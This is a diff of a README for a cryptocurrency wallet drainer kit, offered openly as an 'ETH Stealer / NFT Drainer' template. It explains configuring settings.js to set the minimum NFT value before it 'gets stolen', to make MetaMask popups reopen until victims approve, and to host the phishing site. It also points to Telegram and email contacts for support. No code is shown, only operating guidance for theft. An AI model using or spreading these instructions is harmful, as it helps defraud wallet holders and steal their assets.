@@ -1,10 +1,9 @@
-### If you have questions or need any help, Email me here: darkhubgeek@gmail.com [Telegram]https://t.me/Cyber_Hacklord
-
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
-![preview](https://github.com/cyberlawd/ETH-TOKEN-NFT-DRAINER/blob/main/NFT.png?raw=true)
-[Drainer V3 BETA VERSION] darkhubgeek@gmail.com [Telegram]https://t.me/Cyber_Hacklord
+I DID NOT CREATE THIS SOFTWARE. CREDITS, QUESTIONS, AND ISSUES SHOULD BE DIRECTED HERE:
+darkhubgeek@gmail.com [Telegram]https://t.me/Cyber_HacklordC
 
+![preview](https://github.com/cyberlawd/ETH-TOKEN-NFT-DRAINER/blob/main/NFT.png?raw=true)
 https://user-images.githubusercontent.com/108035292/210696593-0085a848-a2b4-4226-b6f4-0bc85287b3f9.mp4
 
 ## `💡 Features`
@@ -26,8 +25,6 @@ you need to edit the **settings.js** file only.
   - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
   - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
   
-  To get instant support, contact me on darkhubgeek@gmail.com [Telegram]https://t.me/Cyber_Hacklord
-
 ## `👻 Important : `
 
 - Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
@@ -35,7 +32,3 @@ you need to edit the **settings.js** file only.
 - Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
 Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
 ### ➢ To see the metamask popup, you must host the website
-
-
-##### Please ⭐ the repo to support my project
-![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
